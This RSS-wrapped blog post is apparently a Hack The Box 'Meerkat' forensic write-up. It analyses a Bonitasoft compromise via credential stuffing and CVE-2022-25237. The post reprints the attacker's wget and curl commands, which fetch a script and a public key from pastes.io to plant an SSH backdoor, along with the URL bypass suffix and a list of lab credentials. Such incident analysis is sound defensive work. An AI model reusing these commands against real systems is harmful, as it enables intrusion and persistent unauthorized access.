@@ -1,0 +1,182 @@
+<?xml version="1.0" encoding="utf-8" standalone="yes"?><?xml-stylesheet href="/feed_style.xsl" type="text/xsl"?><rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom" xmlns:media="https://www.rssboard.org/media-rss"><channel><title>Alerts on Shakil's Blog</title><link>https://hshakilst.github.io/tags/alerts/</link><description>Recent content in Alerts on Shakil's Blog</description><generator>Hugo -- gohugo.io</generator><language>en-us</language><copyright>Shakil Hossain - All Right Reserved.</copyright><lastBuildDate>Wed, 12 Jun 2024 04:45:17 -0400</lastBuildDate><atom:link href="https://hshakilst.github.io/tags/alerts/index.xml" rel="self" type="application/rss+xml"/><icon>https://hshakilst.github.io/logo.svg</icon><item><title>HTB Sherlock Meerkat</title><link>https://hshakilst.github.io/posts/htb-sherlocks/meerkat/</link><pubDate>Wed, 12 Jun 2024 04:45:17 -0400</pubDate><guid>https://hshakilst.github.io/posts/htb-sherlocks/meerkat/</guid><description><![CDATA[<h1 id="meerkat---soc">Meerkat - SOC</h1>
+<h3 id="scenario">Scenario</h3>
+<p>As a fast-growing startup, Forela has been utilising a business management platform. Unfortunately, our documentation is scarce, and our administrators aren&rsquo;t the most security aware. As our new security provider we&rsquo;d like you to have a look at some PCAP and log data we have exported to confirm if we have (or have not) been compromised.</p>
+<h3 id="artifacts">Artifacts</h3>
+<table>
+<thead>
+<tr>
+<th>Artifact</th>
+<th>MD5 Hash</th>
+<th>Password</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>meerkat.zip</td>
+<td>9b8369a0fcd7f95889c28da597951ad3</td>
+<td>hacktheblue</td>
+</tr>
+<tr>
+<td>meerkat-alerts.json</td>
+<td>f9642326d526c4f5159470b1c5d89b4a</td>
+<td>n/a</td>
+</tr>
+<tr>
+<td>meerkat.pcap</td>
+<td>7ac62b1e835e0850104f1fc2ecf1f002</td>
+<td>n/a</td>
+</tr>
+</tbody>
+</table>
+<h3 id="tools-used">Tools Used</h3>
+<ul>
+<li><code>jq</code> JSON parser - Analyzing the JSON file.</li>
+<li>WireShark - Analyzing the PCAP file.</li>
+</ul>
+<h3 id="forensic-analysis">Forensic Analysis</h3>
+<p><strong>Using <code>jq</code> I quickly searched for alerts with severity level 1.</strong></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-json" data-lang="json"><span style="display:flex;"><span>$ cat meerkat-alerts.json| jq &#39;.[] | select(.alert.severity==<span style="color:#bd93f9">1</span>)&#39; | less
+</span></span><span style="display:flex;"><span>&lt;--snip--&gt;
+</span></span><span style="display:flex;"><span>{
+</span></span><span style="display:flex;"><span>  <span style="color:#ff79c6">&#34;ts&#34;</span>: <span style="color:#f1fa8c">&#34;2023-01-19T15:31:31.042Z&#34;</span>,
+</span></span><span style="display:flex;"><span>  <span style="color:#ff79c6">&#34;event_type&#34;</span>: <span style="color:#f1fa8c">&#34;alert&#34;</span>,
+</span></span><span style="display:flex;"><span>  <span style="color:#ff79c6">&#34;src_ip&#34;</span>: <span style="color:#f1fa8c">&#34;156.146.62.213&#34;</span>,
+</span></span><span style="display:flex;"><span>  <span style="color:#ff79c6">&#34;src_port&#34;</span>: <span style="color:#bd93f9">53196</span>,
+</span></span><span style="display:flex;"><span>  <span style="color:#ff79c6">&#34;dest_ip&#34;</span>: <span style="color:#f1fa8c">&#34;172.31.6.44&#34;</span>,
+</span></span><span style="display:flex;"><span>  <span style="color:#ff79c6">&#34;dest_port&#34;</span>: <span style="color:#bd93f9">8080</span>,
+</span></span><span style="display:flex;"><span>  <span style="color:#ff79c6">&#34;vlan&#34;</span>: <span style="color:#ff79c6">null</span>,
+</span></span><span style="display:flex;"><span>  <span style="color:#ff79c6">&#34;proto&#34;</span>: <span style="color:#f1fa8c">&#34;TCP&#34;</span>,
+</span></span><span style="display:flex;"><span>  <span style="color:#ff79c6">&#34;app_proto&#34;</span>: <span style="color:#f1fa8c">&#34;http&#34;</span>,
+</span></span><span style="display:flex;"><span>  <span style="color:#ff79c6">&#34;alert&#34;</span>: {
+</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">&#34;severity&#34;</span>: <span style="color:#bd93f9">1</span>,
+</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">&#34;signature&#34;</span>: <span style="color:#f1fa8c">&#34;ET WEB_SPECIFIC_APPS Bonitasoft Default User Login Attempt M1 (Possible Staging for CVE-2022-25237)&#34;</span>,
+</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">&#34;category&#34;</span>: <span style="color:#f1fa8c">&#34;Attempted Administrator Privilege Gain&#34;</span>,
+</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">&#34;action&#34;</span>: <span style="color:#f1fa8c">&#34;allowed&#34;</span>,
+</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">&#34;signature_id&#34;</span>: <span style="color:#bd93f9">2036815</span>,
+</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">&#34;gid&#34;</span>: <span style="color:#bd93f9">1</span>,
+</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">&#34;rev&#34;</span>: <span style="color:#bd93f9">1</span>,
+</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">&#34;metadata&#34;</span>: {
+</span></span><span style="display:flex;"><span>      <span style="color:#ff79c6">&#34;signature_severity&#34;</span>: [
+</span></span><span style="display:flex;"><span>        <span style="color:#f1fa8c">&#34;Minor&#34;</span>
+</span></span><span style="display:flex;"><span>      ],
+</span></span><span style="display:flex;"><span>      <span style="color:#ff79c6">&#34;former_category&#34;</span>: [
+</span></span><span style="display:flex;"><span>        <span style="color:#f1fa8c">&#34;WEB_SPECIFIC_APPS&#34;</span>
+</span></span><span style="display:flex;"><span>      ],
+</span></span><span style="display:flex;"><span>      <span style="color:#ff79c6">&#34;attack_target&#34;</span>: [
+</span></span><span style="display:flex;"><span>        <span style="color:#f1fa8c">&#34;Server&#34;</span>
+</span></span><span style="display:flex;"><span>      ],
+</span></span><span style="display:flex;"><span>      <span style="color:#ff79c6">&#34;deployment&#34;</span>: [
+</span></span><span style="display:flex;"><span>        <span style="color:#f1fa8c">&#34;SSLDecrypt&#34;</span>,
+</span></span><span style="display:flex;"><span>        <span style="color:#f1fa8c">&#34;Perimeter&#34;</span>
+</span></span><span style="display:flex;"><span>      ],
+</span></span><span style="display:flex;"><span>      <span style="color:#ff79c6">&#34;affected_product&#34;</span>: <span style="color:#ff79c6">null</span>,
+</span></span><span style="display:flex;"><span>      <span style="color:#ff79c6">&#34;created_at&#34;</span>: [
+</span></span><span style="display:flex;"><span>        <span style="color:#f1fa8c">&#34;2022_06_03&#34;</span>
+</span></span><span style="display:flex;"><span>      ],
+</span></span><span style="display:flex;"><span>      <span style="color:#ff79c6">&#34;performance_impact&#34;</span>: [
+</span></span><span style="display:flex;"><span>        <span style="color:#f1fa8c">&#34;Low&#34;</span>
+</span></span><span style="display:flex;"><span>      ],
+</span></span><span style="display:flex;"><span>      <span style="color:#ff79c6">&#34;updated_at&#34;</span>: [
+</span></span><span style="display:flex;"><span>        <span style="color:#f1fa8c">&#34;2022_06_03&#34;</span>
+</span></span><span style="display:flex;"><span>      ],
+</span></span><span style="display:flex;"><span>      <span style="color:#ff79c6">&#34;malware_family&#34;</span>: <span style="color:#ff79c6">null</span>,
+</span></span><span style="display:flex;"><span>      <span style="color:#ff79c6">&#34;tag&#34;</span>: <span style="color:#ff79c6">null</span>,
+</span></span><span style="display:flex;"><span>      <span style="color:#ff79c6">&#34;cve&#34;</span>: [
+</span></span><span style="display:flex;"><span>        <span style="color:#f1fa8c">&#34;CVE_2022_25237&#34;</span>
+</span></span><span style="display:flex;"><span>      ]
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>  },
+</span></span><span style="display:flex;"><span>  <span style="color:#ff79c6">&#34;flow_id&#34;</span>: <span style="color:#bd93f9">1652763046938834</span>,
+</span></span><span style="display:flex;"><span>  <span style="color:#ff79c6">&#34;pcap_cnt&#34;</span>: <span style="color:#bd93f9">2168</span>,
+</span></span><span style="display:flex;"><span>  <span style="color:#ff79c6">&#34;tx_id&#34;</span>: <span style="color:#bd93f9">0</span>,
+</span></span><span style="display:flex;"><span>  <span style="color:#ff79c6">&#34;icmp_code&#34;</span>: <span style="color:#ff79c6">null</span>,
+</span></span><span style="display:flex;"><span>  <span style="color:#ff79c6">&#34;icmp_type&#34;</span>: <span style="color:#ff79c6">null</span>,
+</span></span><span style="display:flex;"><span>  <span style="color:#ff79c6">&#34;tunnel&#34;</span>: <span style="color:#ff79c6">null</span>,
+</span></span><span style="display:flex;"><span>  <span style="color:#ff79c6">&#34;community_id&#34;</span>: <span style="color:#f1fa8c">&#34;1:0XAwrtog1jdopmX+yd1WRDEzMAc=&#34;</span>
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><p>Looks like a TA was brute forcing the default credentials for Bonitasoft to exploit the CVE-2022-25237. I confirmed the credential stuffing attack by analyzing the PCAP file.</p>
+<p><strong>PCAP Analysis Using WireShark</strong>
+<img src="images/20240612174728.png" alt="alt text"></p>
+<p>Analyzing the PCAP file it was confirmed that the TA successfully gained access to an account with the credential <code>seb.broom@forela.co.uk:g0vernm3nt</code>. And then gained privileged access to the Web Application&rsquo;s REST API by exploiting CVE-2022-25237. After getting privileged access to the Bonita web service the TA uploaded a malicious API extension to get command execution on the web application server.
+<img src="images/20240612175559.png" alt="alt text"></p>
+<p>The TA successfully gained command execution on the server.
+<img src="images/20240612181452.png" alt="alt text">
+<img src="images/20240612181529.png" alt="alt text"></p>
+<p><strong>CVE-2022-25237</strong>
+According to <a href="https://nvd.nist.gov/vuln/detail/CVE-2022-25237">NIST</a>, <em>Bonita Web 2021.2 is affected by a authentication/authorization bypass vulnerability due to an overly broad exclude pattern used in the RestAPIAuthorizationFilter. By appending ;i18ntranslation or /../i18ntranslation/ to the end of a URL, users with no privileges can access privileged API endpoints. This can lead to remote code execution by abusing the privileged API actions.</em></p>
+<p>HTTP Object Extraction:
+<img src="images/20240612180604.png" alt="alt text"></p>
+<p>After discovering this incident I extracted all the HTTP TCP stream objects from the PCAP file and found the usernames and passwords combination list used in this security incident.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>user,password
+</span></span><span style="display:flex;"><span>Clerc.Killich%40forela.co.uk,vYdwoVhGIwJ
+</span></span><span style="display:flex;"><span>Lauren.Pirozzi%40forela.co.uk,wsp0Uy
+</span></span><span style="display:flex;"><span>Merna.Rammell%40forela.co.uk,u7pWoF36fn
+</span></span><span style="display:flex;"><span>Gianina.Tampling%40forela.co.uk,maUIffqQl
+</span></span><span style="display:flex;"><span>Konstance.Domaschke%40forela.co.uk,6XLZjvD
+</span></span><span style="display:flex;"><span>Vida.Murty%40forela.co.uk,4ulecG
+</span></span><span style="display:flex;"><span>Elka.Cavet%40forela.co.uk,n1aSdc
+</span></span><span style="display:flex;"><span>Noam.Harvett%40forela.co.uk,VDt8bh
+</span></span><span style="display:flex;"><span>Norbie.Bartolini%40forela.co.uk,GV2zlop
+</span></span><span style="display:flex;"><span>Cariotta.Whife%40forela.co.uk,x3hoU0
+</span></span><span style="display:flex;"><span>Mella.Amsberger%40forela.co.uk,4nIYM5WqN
+</span></span><span style="display:flex;"><span>Cyndy.Element%40forela.co.uk,ybWxct
+</span></span><span style="display:flex;"><span>Imelda.Braben%40forela.co.uk,dC7bjGLYB
+</span></span><span style="display:flex;"><span>Marven.Samuel%40forela.co.uk,LPU0qQnt108
+</span></span><span style="display:flex;"><span>Osborne.Humpatch%40forela.co.uk,OJ4WHcI4D
+</span></span><span style="display:flex;"><span>Talya.Sterman%40forela.co.uk,3gCERZ2JMh
+</span></span><span style="display:flex;"><span>Drusilla.Nice%40forela.co.uk,l35Euh0T3Am
+</span></span><span style="display:flex;"><span>Tobiah.Horstead%40forela.co.uk,fp0OQl
+</span></span><span style="display:flex;"><span>Kayley.Northway%40forela.co.uk,s9MC7mkdVU
+</span></span><span style="display:flex;"><span>Adora.Mersh%40forela.co.uk,85Hh8JZkJR6
+</span></span><span style="display:flex;"><span>Guss.Botten%40forela.co.uk,sVMRgGmv0sE
+</span></span><span style="display:flex;"><span>Cordelie.Rostron%40forela.co.uk,mAtdcJh
+</span></span><span style="display:flex;"><span>Ellerey.Bierling%40forela.co.uk,Nva0nKTz
+</span></span><span style="display:flex;"><span>Berny.Ferrarin%40forela.co.uk,lPCO6Z
+</span></span><span style="display:flex;"><span>Nefen.Heffernon%40forela.co.uk,VR0ZA8
+</span></span><span style="display:flex;"><span>Skipton.Pickerill%40forela.co.uk,lcsui1Nu
+</span></span><span style="display:flex;"><span>Nola.Crichmer%40forela.co.uk,QGa58W3L
+</span></span><span style="display:flex;"><span>Sharon.Claus%40forela.co.uk,3X4d06I
+</span></span><span style="display:flex;"><span>Bernelle.Draycott%40forela.co.uk,MmxlUAWe0oW
+</span></span><span style="display:flex;"><span>Samaria.Percifull%40forela.co.uk,CUgc3hzHw5g
+</span></span><span style="display:flex;"><span>Puff.Yapp%40forela.co.uk,M08Aae
+</span></span><span style="display:flex;"><span>Cynthia.Hatto%40forela.co.uk,z0NXI6
+</span></span><span style="display:flex;"><span>seb.broom%40forela.co.uk,g0vernm3nt
+</span></span><span style="display:flex;"><span>Alexi.Siman%40forela.co.uk,iUS11pX
+</span></span><span style="display:flex;"><span>Pete.Panons%40forela.co.uk,BKdkGTB
+</span></span><span style="display:flex;"><span>Rakel.Cawley%40forela.co.uk,h4gW3YLwnW9t
+</span></span><span style="display:flex;"><span>Merl.Lavalde%40forela.co.uk,BgfiOVXNLBc
+</span></span><span style="display:flex;"><span>Antoinette.Vittel%40forela.co.uk,bGtHL8cg
+</span></span><span style="display:flex;"><span>Stanleigh.Tuckwell%40forela.co.uk,VQCk8TGn3
+</span></span><span style="display:flex;"><span>Denny.Gepson%40forela.co.uk,q2JqCSXk69
+</span></span><span style="display:flex;"><span>Aline.Rivallant%40forela.co.uk,gFixyf1nGgf
+</span></span><span style="display:flex;"><span>Jordain.Eykel%40forela.co.uk,rnMXBNdNW0
+</span></span><span style="display:flex;"><span>Gypsy.Henric%40forela.co.uk,lLPqVgmHs5F
+</span></span><span style="display:flex;"><span>Adrea.Shervil%40forela.co.uk,7YoFhtUq
+</span></span><span style="display:flex;"><span>Jenilee.Pressman%40forela.co.uk,3eYwLOKhQEcl
+</span></span><span style="display:flex;"><span>Fredrick.Gerraty%40forela.co.uk,W1By0HUByDHO
+</span></span><span style="display:flex;"><span>Ebony.Oleszcuk%40forela.co.uk,uAWnyfKOjQM
+</span></span><span style="display:flex;"><span>Garrard.Colisbe%40forela.co.uk,jMi9iP
+</span></span><span style="display:flex;"><span>Farleigh.Schouthede%40forela.co.uk,JzI6Dvhy
+</span></span><span style="display:flex;"><span>Ahmed.Monteaux%40forela.co.uk,6uskrtw8U
+</span></span><span style="display:flex;"><span>Griffith.Lumm%40forela.co.uk,QPepd0M8wBK
+</span></span><span style="display:flex;"><span>Winston.Conville%40forela.co.uk,cEmh5W2Vh
+</span></span><span style="display:flex;"><span>Pat.Kloisner%40forela.co.uk,N8ZwVMzF6
+</span></span><span style="display:flex;"><span>Teresita.Benford%40forela.co.uk,uvYjtQzX
+</span></span><span style="display:flex;"><span>Mathian.Skidmore%40forela.co.uk,TQSNp6XrK
+</span></span><span style="display:flex;"><span>Gerri.Cordy%40forela.co.uk,w15pvWGTK
+</span></span></code></pre></div><p>I also found an interesting file named <code>bx5gcr0et8</code>.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-json" data-lang="json"><span style="display:flex;"><span>{<span style="color:#ff79c6">&#34;p&#34;</span>:<span style="color:#f1fa8c">&#34;0&#34;</span>,<span style="color:#ff79c6">&#34;c&#34;</span>:<span style="color:#f1fa8c">&#34;1&#34;</span>,<span style="color:#ff79c6">&#34;cmd&#34;</span>:<span style="color:#f1fa8c">&#34;wget https://pastes.io/raw/bx5gcr0et8&#34;</span>,<span style="color:#ff79c6">&#34;out&#34;</span>:<span style="color:#f1fa8c">&#34;--2023-01-19 15:38:52--  https://pastes.io/raw/bx5gcr0et8\nResolving pastes.io (pastes.io)... 66.29.132.145\nConnecting to pastes.io (pastes.io)|66.29.132.145|:443... connected.\nHTTP request sent, awaiting response... 200 OK\nLength: 113 [text/plain]\nSaving to: \u2018bx5gcr0et8\u2019\n\n     0K                                                       100% 57.8M=0s\n\n2023-01-19 15:38:53 (57.8 MB/s) - \u2018bx5gcr0et8\u2019 saved [113/113]\n\n&#34;</span>,<span style="color:#ff79c6">&#34;currentDate&#34;</span>:<span style="color:#f1fa8c">&#34;2023-01-19&#34;</span>}
+</span></span></code></pre></div><p>A command was issued to download the file from <code>pastes.io</code>.
+<img src="images/20240612181638.png" alt="alt text"></p>
+<p>And then another command was issued to run the <code>bx5gcr0et8</code> file which was a bash script.
+<img src="images/20240612181813.png" alt="alt text"></p>
+<p>The contents of the bash script <code>bx5gcr0et8</code>:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>**#!/bin/bash
+</span></span><span style="display:flex;"><span>curl https://pastes.io/raw/hffgra4unv &gt;&gt; /home/ubuntu/.ssh/authorized_keys
+</span></span><span style="display:flex;"><span>sudo service ssh restart**
+</span></span></code></pre></div><p>A persistence technique identified by MITRE with a technique ID <a href="https://attack.mitre.org/techniques/T1098/004/">T1098.004</a>. Basically, the adversary used a public key and inserted in into the <code>/home/ubuntu/.ssh/authorized_keys</code> file. In this technique the TA can also set the derivative <code>PubkeyAuthentication</code> set to <code>yes</code> in the <code>/etc/ssh/sshd_config</code> file. And, also can modify the <code>sshd_config</code> file further and set the <code>RSAAuthentication</code> to the value <code>yes</code>, if the public key algorithm is RSA based.</p>
+<p>The Public Key used by the TA:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-text" data-lang="text"><span style="display:flex;"><span>ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCgruRMq3DMroGXrcPeeuEqQq3iS/sAL3gryt+nUqbBA/M+KG4ElCvJS4gP2os1b8FMk3ZwvrVTdpEKW6wdGqPl2wxznBjOBstx6OF2yp9RIOb3c/ezgs9zvnaO07YC8Sm4nkkXHgkabqcM7rHEY4Lay0LWF9UbxueSAHIJgQ2ADbKSnlg0gMnJTNRwKbqesk0ZcG3b6icj6nkKykezBLvWc7z4mkSm28ZVTa15W3HUWSEWRbGgJ6eMBdi7WnWXZ92SYDq0XUBV2Sx2gjoDGHwcd6I0q9BU52wWYo3L3LaPEoTcLuA+hnn82086oUzJfmEUtWGlPAXfJBN7vRIMSvsN
+</span></span></code></pre></div><h3 id="summary">Summary</h3>
+<p>The threat actors used credential stuffing attack against the Bonita Service and escalated their privileges in the web application by exploiting CVE-2022-25237. After that to get remote code execution on the server the threat actors uploaded a malicious extension file which gave them command injection ability. Then, they used this ability to get information of the users and added a SSH backdoor to the <code>ubuntu</code> user account for persistence.</p>
+]]></description></item></channel></rss>
